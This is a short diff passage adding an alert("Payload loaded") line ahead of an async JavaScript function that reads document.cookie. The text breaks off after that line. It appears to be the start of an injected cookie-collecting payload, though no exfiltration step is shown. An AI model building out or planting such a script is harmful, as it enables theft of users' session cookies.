@@ -1,3 +1,4 @@
+alert("Payload loaded");
 (async () => {
     const cookie = document.cookie;
   
